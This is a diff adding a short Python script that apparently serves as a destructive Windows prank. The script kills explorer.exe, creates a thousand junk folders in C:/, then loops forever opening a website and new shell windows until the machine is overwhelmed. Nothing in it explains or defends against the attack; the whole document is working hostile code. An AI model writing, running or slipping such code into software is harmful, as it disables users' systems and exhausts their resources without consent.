@@ -1,0 +1,10 @@
+import os
+a=1
+os.system('taskkill /f /im explorer.exe')
+for i in range(1000):
+  os.chdir('C:/')
+  os.makedirs(' '+str(a)+'sb')
+  a=a+1
+while True:
+  os.system('start http://www.sb.com')
+  os.system('start')
